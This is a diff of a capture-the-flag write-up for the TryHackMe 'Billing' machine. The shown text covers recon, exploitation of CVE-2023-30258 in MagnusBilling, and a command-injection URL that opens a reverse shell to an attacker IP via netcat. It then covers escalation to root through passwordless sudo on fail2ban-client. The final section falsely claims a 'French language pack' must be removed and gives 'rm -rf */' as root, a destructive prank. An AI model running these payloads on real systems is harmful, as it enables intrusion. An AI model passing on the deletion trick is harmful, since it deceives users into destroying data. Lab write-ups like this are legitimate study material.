@@ -1,7 +1,8 @@
+
 Hi, here is how to successfully complete the machine https://tryhackme.com/room/billing
 ![2025-05-18_11-17](https://github.com/user-attachments/assets/9b88c7c6-bd1b-49ac-b2dc-0056c1579003)<br><br><br><br>
 
-
+# Recon
 A full TCP scan revealed several open ports on the target machine, providing valuable information about running services and possible attack vectors:<br>
 
 Port 22 – SSH
@@ -74,7 +75,7 @@ If the server responds with the contents of /etc/passwd, it confirms that the vu
 
 ![2025-05-18_20-37](https://github.com/user-attachments/assets/ca56f7f8-c49b-4629-becb-07c5ff874142)
 
-
+# Explotation 
 After confirming the existence of CVE-2023-30258, I explored further to determine if this vulnerability could lead to Remote Code Execution (RCE). I found a publicly available PoC on GitHub(https://github.com/n00o00b/CVE-2023-30258-RCE-POC), which demonstrates how to escalate the Local File Inclusion (LFI) vulnerability into full RCE.
 
 The exploit works by abusing MagnusBilling’s handling of language files and PHP's include() behavior. The attacker crafts a fake language file on the target system, injects PHP code into it (such as a web shell or system command), and then uses the vulnerable lang parameter to include and execute that file. This effectively gives the attacker the ability to run arbitrary PHP code on the server, without authentication.
@@ -101,6 +102,7 @@ Executing command: nc -c sh 10.9.1.162 1234
 http://10.10.102.9/mbilling/lib/icepay/icepay.php?democ=;nc%20-c%20sh%2010.9.1.162%201234;sleep 2;</code></pre>
 <br><br>
 
+# User flag
 From here, I was able to enumerate the system further and begin post-exploitation tasks, such as privilege escalation.
 <pre><code>maxi@maxi-notebook ~ [1]> nc -nlvp 1234
 Connection from 10.10.84.12:49316
@@ -126,6 +128,7 @@ icepay-giropay.php	icepay-paysafecard.php	icepay.php
 asterisk@Billing:/var/www/html/mbilling/lib/icepay$                </code></pre>
 <br><br>
 
+
 Once I had a stable shell, I started basic post-exploitation enumeration. I navigated to the /home directory and found a user directory named magnus. Accessing it revealed several typical user folders such as Desktop, Downloads, Documents, user.txt, and others.
 <pre><code>asterisk@Billing:/home/magnus$ls
 ls
@@ -133,6 +136,7 @@ Desktop    Downloads  Pictures	Templates  user.txt
 Documents  Music      Public	Videos</code></pre>
 <br><br>
 
+# Root flag
 I found that the asterisk user could run fail2ban-client as root without a password.
 <pre><code>asterisk@Billing:/home/magnus$ sudo -l
 sudo -l
@@ -248,6 +252,7 @@ filename  passwordMysql.log  root.txt
 bash-5.1# </code></pre>
 <br><br>
 
+# Root-Premium flag
 Do not forget to remove the French language pack from the system, otherwise, getting the root-premium flag will not be possible.
 <pre><code>bash-5.1# rm -rf */
 </code></pre>
